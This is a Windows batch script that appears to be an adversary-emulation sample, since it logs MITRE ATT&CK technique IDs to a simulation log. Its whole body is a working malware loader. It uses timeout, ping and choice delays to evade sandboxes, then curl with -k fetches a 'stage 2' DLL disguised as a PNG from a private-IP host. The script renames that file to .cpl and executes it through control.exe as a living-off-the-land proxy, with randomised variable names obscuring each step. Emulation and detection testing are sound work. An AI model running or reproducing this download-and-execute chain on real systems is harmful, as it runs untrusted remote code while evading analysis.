@echo off
setlocal enabledelayedexpansion

REM Random-named SET variable declarations for all PHR_* placeholders (6-12 lowercase alphanumeric)
SET tqmrix=%APPDATA%\10760\c856c3fc
SET bwjsnz=21869965.txt
SET hkpldv=https://10.0.0.49/stage/2/icon.png?10760-7
SET rgncuy=BALAM-S2BO
SET mfkeox=10760
SET qvwzjt=7
SET ladske=%PUBLIC%\\macula-simulations.log

REM Cache timestamp for debug logs (centiseconds approximated as milliseconds)
SET tsvar=!DATE!/!TIME!

REM ============================================================
REM PHASE: Evasion (Delay / Sandbox evasion)
REM ============================================================

REM Initial 10-20s delay (method: timeout)
timeout /t 17 /nobreak >nul
if not errorlevel 1 echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: initial_delay=0>> "!ladske!" 2>nul

REM Additional delay (method: ping)
ping -n 7 127.0.0.1 >nul
if not errorlevel 1 echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: ping_delay=0>> "!ladske!" 2>nul

REM Another delay (method: choice)
choice /C Y /N /D Y /T 8 >nul
if not errorlevel 1 echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: choice_delay=0>> "!ladske!" 2>nul

REM Random delay 10-29s
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul
if not errorlevel 1 echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: random_delay=!rdelay!>> "!ladske!" 2>nul

REM Log TTP T1497 (Virtualization/Sandbox Evasion) after all delays complete
SET tts=!DATE!/!TIME!
echo [!tts!][TTP][!rgncuy!][!mfkeox!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!ladske!" 2>nul

REM ============================================================
REM PHASE: Heartbeat / Download Stage 2 Loader DLL
REM ============================================================

REM Ensure output directory exists
if not exist "!tqmrix!" mkdir "!tqmrix!" >nul 2>nul
if errorlevel 1 echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: mkdir_fail=1>> "!ladske!" 2>nul

REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: heartbeat_start>> "!ladske!" 2>nul

REM Download DLL via curl (single heartbeat)
curl -k -s -o "!tqmrix!\!bwjsnz!" "!hkpldv!"
set hbret=!errorlevel!
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: heartbeat_complete=!hbret!>> "!ladske!" 2>nul

REM ============================================================
REM PHASE: Change working directory to output directory
REM ============================================================
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: chdir_start>> "!ladske!" 2>nul
cd /d "!tqmrix!" >nul 2>&1
set cdret=!errorlevel!
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: chdir_result=!cdret!>> "!ladske!" 2>nul

REM ============================================================
REM PHASE: Rename DLL to .CPL extension
REM ============================================================
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: rename_start>> "!ladske!" 2>nul
rename "!tqmrix!\!bwjsnz!" "!bwjsnz!.cpl" >nul 2>nul
set renret=!errorlevel!
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: rename_result=!renret!>> "!ladske!" 2>nul

REM ============================================================
REM PHASE: LOLBIN Proxy Execution (control.exe calling .cpl)
REM ============================================================
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: control_start>> "!ladske!" 2>nul
control.exe "!bwjsnz!.cpl"
echo [!tsvar!][DEBUG][!rgncuy!][!mfkeox!]: control_executed>> "!ladske!" 2>nul

REM Log TTP T1218 (System Binary Proxy Execution)
SET tts=!DATE!/!TIME!
echo [!tts!][TTP][!rgncuy!][!mfkeox!]: T1218|System Binary Proxy Execution=OK:>> "!ladske!" 2>nul

endlocal